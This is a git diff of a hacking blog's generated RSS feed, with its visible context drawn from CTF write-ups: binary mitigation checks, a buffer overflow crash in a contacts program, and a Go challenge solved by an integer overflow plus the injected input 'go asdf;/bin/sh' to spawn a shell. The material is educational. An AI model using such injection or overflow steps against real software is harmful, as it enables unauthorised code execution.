@@ -5,9 +5,9 @@
     <description>A most excellent adventure in hacking</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 10 Jul 2018 15:00:46 -0700</pubDate>
-    <lastBuildDate>Tue, 10 Jul 2018 15:00:46 -0700</lastBuildDate>
-    <generator>Jekyll v3.4.5</generator>
+    <pubDate>Tue, 10 Jul 2018 17:01:07 -0700</pubDate>
+    <lastBuildDate>Tue, 10 Jul 2018 17:01:07 -0700</lastBuildDate>
+    <generator>Jekyll v3.7.3</generator>
     
       <item>
         <title>Making h1-ctfs</title>
@@ -127,7 +127,7 @@
 
 &lt;h2 id=&quot;️-where-the-code-be&quot;&gt;🏎️ Where the code be?&lt;/h2&gt;
 
-&lt;p&gt;You can check out the shitty APK submission server I put together &lt;a href=&quot;&quot;&gt;here&lt;/a&gt;. If you feel inclined to work on making this better, I will for sure work with you on your PRs.&lt;/p&gt;
+&lt;p&gt;You can check out the shitty APK submission server I put together &lt;a href=&quot;https://github.com/breadchris/apk-submission-queue&quot;&gt;here&lt;/a&gt;. If you feel inclined to work on making this better, I will for sure work with you on your PRs.&lt;/p&gt;
 </description>
         <pubDate>Sun, 10 Jun 2018 07:05:00 -0700</pubDate>
         <link>http://localhost:4000/ctf/android/2018/06/10/android-pwnable-ctf-challenges/</link>
@@ -158,7 +158,7 @@
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;vagrant@kamino csaw2015finals]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file hipster
 hipster: ELF 32-bit LSB  executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b23801cfaa0d9395b962e7115b15f85de01b22ca, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;vagrant@kamino csaw2015finals]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;~/Template/checksec.sh --file hipster
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;vagrant@kamino csaw2015finals]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;~/Template/checksec.sh &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; hipster
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   hipster&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -548,12 +548,12 @@ stack2+164  numbers and stuff
 
 &lt;p&gt;Let’s start by getting an idea what is up with it:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;vagrant@precise64:~/csawctf$ &lt;/span&gt;file precision
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vagrant@precise64:~/csawctf&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file precision
 prec: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xf2c69f92c3f6d68319ee39c0926e84bccdeb0371, not stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Alright, and the security mitigations it has:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;vagrant@precise64:~/csawctf$ &lt;/span&gt;~/Template/checksec.sh --file precision
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vagrant@precise64:~/csawctf&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;~/Template/checksec.sh &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; precision
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precfound      NX enabled    No PIE          No RPATH   No RUNPATH   contacts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -646,12 +646,12 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 
 &lt;p&gt;Let’s start by getting an idea what is up with it:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;vagrant@precise64:~/csawctf$ &lt;/span&gt;file contacts
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vagrant@precise64:~/csawctf&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file contacts
 contacts: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x9736c7a26b5c55f97874c5e62d359e02c88cf2f1, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Alright, and the security mitigations it has:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;vagrant@precise64:~/csawctf$ &lt;/span&gt;~/Template/checksec.sh --file contacts
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vagrant@precise64:~/csawctf&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;~/Template/checksec.sh &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; contacts
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   contacts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -659,7 +659,7 @@ Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RU
 
 &lt;p&gt;So if we play around with this a bit, we get an idea as to what is going on:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;vagrant@precise64:~/csawctf$ &lt;/span&gt;./contacts
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vagrant@precise64:~/csawctf&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./contacts
 Menu:
 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Create contact
 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Remove contact
@@ -669,7 +669,7 @@ Menu:
 
 &lt;p&gt;So we can create, remove, edit and display contacts. There are some things that we could look at first, the path that I first chose was looking at was the fact that you could specify how long your description was in your contact (this is a pretty common vuln in ctf problems).&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;1
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 1
 Contact info:
     Name: Poopy
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] Haven&lt;span class=&quot;s1&quot;&gt;'t written a parser for phone numbers; You have 10 numbers
@@ -791,7 +791,7 @@ Contact info:
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Name to change? Dolan
 1.Change name
 2.Change description
-&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 1
 New name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Menu:
 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Create contact
@@ -799,7 +799,7 @@ Menu:
 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Edit contact
 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Display contacts
 5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Exit
-&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;4
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 4
 Contacts:
     Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     Length 1094795585
@@ -812,10 +812,10 @@ Segmentation fault&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;p&gt;Now what is important to realize is that you have to make a second contact because the crash is a result of you overflowing the name buffer of the first person all the way into a pointer of the second person. And when you go to print out the second person, the program doesn’t have access to the memory at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt;:&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------------------[regs]
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;regs]
   ESI: 0xFFFFCF88  EDI: 0x41414141
---------------------------------------------------------------------------[code]
-&lt;span class=&quot;gp&quot;&gt;=&amp;gt; &lt;/span&gt;0xf7e64a6a &amp;lt;vfprintf+9098&amp;gt;:    repnz scas al,BYTE PTR es:[edi] ; Can&lt;span class=&quot;s1&quot;&gt;'t dereference edi, because edi = 0x41414141
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;code]
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 0xf7e64a6a &amp;lt;vfprintf+9098&amp;gt;:    repnz scas al,BYTE PTR es:[edi] &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Can&lt;span class=&quot;s1&quot;&gt;'t dereference edi, because edi = 0x41414141
 --------------------------------------------------------------------------------
 0xf7e64a6a in vfprintf () from /lib/i386-linux-gnu/libc.so.6
 gdb$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
@@ -869,7 +869,7 @@ gdb$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Edit contact
 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Display contacts
 5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;Exit
-&lt;span class=&quot;gp&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 1
 Contact info:
     Name: A
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] Haven&lt;span class=&quot;s1&quot;&gt;'t written a parser for phone numbers; You have 10 numbers
@@ -1079,7 +1079,7 @@ Contacts:
 
 &lt;p&gt;Checking out what type of file we were dealing with here:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;[~/Documents/CTFs/backdoor]$ &lt;/span&gt;file team
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;~/Documents/CTFs/backdoor]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file team
 team: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, stripped&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Alright 32 bit, let’s crack open IDA for this one then :D&lt;/p&gt;
@@ -1258,7 +1258,7 @@ delphi: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot
 
 &lt;p&gt;Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  yvr  objdump -t delphi | grep go
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;➜  yvr  objdump &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; delphi | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;go
 0000000000506920 l    d  .gopclntab	0000000000000000              .gopclntab
 0000000000754ff0 l    d  .got	0000000000000000              .got
 0000000000755000 l    d  .got.plt	0000000000000000              .got.plt
@@ -1282,7 +1282,7 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;OK, so we have a place to input data… let’s first look for a place we can latch onto:&lt;/p&gt;
 
@@ -1358,15 +1358,15 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go
 Sneaky, sneaky. Go where? How fast?
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;something &lt;span class=&quot;k&quot;&gt;else
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; something &lt;span class=&quot;k&quot;&gt;else
 &lt;/span&gt;Whos that?
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;asdfasdf
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; asdfasdf
 Whos that?
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;asdfasdfasd
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; asdfasdfasd
 Maybe? Hmmm.
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;So “go” is definetly what we want for the first part of our payload.&lt;/p&gt;
 
@@ -1502,13 +1502,13 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf 65494    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 0 == 65494 means eax = 0&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf 65495    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 1 == 65494 means eax = 1&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf 65496    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 2 == 65494 means eax = 2&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf 65497    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 3 == 65494 means eax = 3&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf 65498    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 4 == 65494 means eax = 4&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf 65494    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 0 == 65494 means eax = 0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf 65495    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 1 == 65494 means eax = 1&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf 65496    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 2 == 65494 means eax = 2&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf 65497    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 3 == 65494 means eax = 3&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf 65498    &lt;span class=&quot;c&quot;&gt;# 2^16 - 42 + 4 == 65494 means eax = 4&lt;/span&gt;
 asdf
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Boom! So we got that system call to be executed and all it does right now is “echo &lt;our string=&quot;&quot;&gt;&quot;. But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D&lt;/our&gt;&lt;/p&gt;
 
@@ -1517,11 +1517,11 @@ Welcome!
 
 Are you ready to play 20 questions? No? Perfect!
 Im thinking of something big, metal, and orange. Go!
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;go asdf;/bin/sh 65498
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; go asdf&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/bin/sh 65498
 asdf
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat flag.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
 flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;something or other&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# Not the actual flag, running locally&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit an integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D&lt;/p&gt;
 </description>
@@ -1552,7 +1552,7 @@ flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;something or other&lt;span cla
 
 &lt;p&gt;We start out by sshing into the fusion vm and startup gdb as root:&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;[~]$ &lt;/span&gt;ssh fusion@&amp;lt;ip address of fusion vm&amp;gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fusion@&amp;lt;ip address of fusion vm&amp;gt;
 fusion@172.16.76.131&lt;span class=&quot;s1&quot;&gt;'s password: 
 fusion@fusion:~$ sudo gdb
 (gdb) &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
